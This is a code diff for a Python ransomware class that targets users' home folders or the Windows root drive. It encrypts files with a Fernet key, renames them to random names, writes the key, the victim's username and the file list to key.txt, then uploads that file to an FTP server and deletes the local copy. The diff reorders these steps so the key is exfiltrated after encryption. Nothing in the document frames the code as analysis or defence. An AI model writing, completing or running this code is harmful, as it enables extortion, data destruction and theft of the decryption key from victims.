@@ -11,41 +11,45 @@ class Ransomware:
     def __init__(self, 
                  files=[], 
                  directories=[], 
-                 files_dict={}, 
+                 files_dict={},
+                 get_name = "",
+                 key_dir="",
                  key=Fernet.generate_key()
                  ) -> None:
-        
-        get_name1 = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
-        name = subprocess.run(get_name1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).decode("utf-8")
-
-        keytxt = f"""
-Key:   {key}\n
-Name:  {name}\n
-Files: {files}\n
-Dict:  {files_dict}
-"""
-        with open("key.txt", "wb") as key_file:
-            key_file.write(keytxt)
-
-        key_dir = f"{os.getcwd()}" + "/key.txt"
-        self.key_dir = key_dir
 
         system_name = platform.system()
         if system_name == "Windows":
+            get_name = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
             directory = "C:/"
         elif system_name == "Darwin":
+            get_name = "whoami"
             directory = "/Users"
         elif system_name == "Linux":
+            get_name = "whoami"
             directory = "/home"
         else:
+            get_name = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
             directory = "C:/"
 
-        os.chdir(directory)
-
-        self.files = files
-        self.directories = directories
+        name = subprocess.run(get_name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).decode("utf-8")
+        
         self.key = key
+        self.name = name
+        self.files = files
+        self.key_dir = key_dir
         self.files_dict = files_dict
+        self.directories = directories
+        
+
+        keytxt = f"""
+Key:   {self.key}\n
+Name:  {self.name}\n
+Files: {self.files}\n
+Dict:  {self.files_dict}
+""" 
+        self.keytxt = keytxt
+
+        os.chdir(directory)
 
     def id_generator(self, 
                      size, 
@@ -115,6 +119,11 @@ Dict:  {files_dict}
 
             os.rename(_, last)
 
+    def files_write(self) -> None:
+        self.key_dir = f"{os.getcwd()}" + "/key.txt"
+        with open(self.key_dir, "wb") as key_file:
+            key_file.write(self.keytxt)
+
     def send_file_to_ftp(self, 
                          server="", 
                          username="", 
@@ -141,7 +150,8 @@ Dict:  {files_dict}
         os.remove(file_path)
 
 starter = Ransomware()
-starter.send_file_to_ftp()
 starter.files_dir()
 starter.encrypt_loop()
 starter.rename_files()
+starter.files_write()
+starter.send_file_to_ftp()
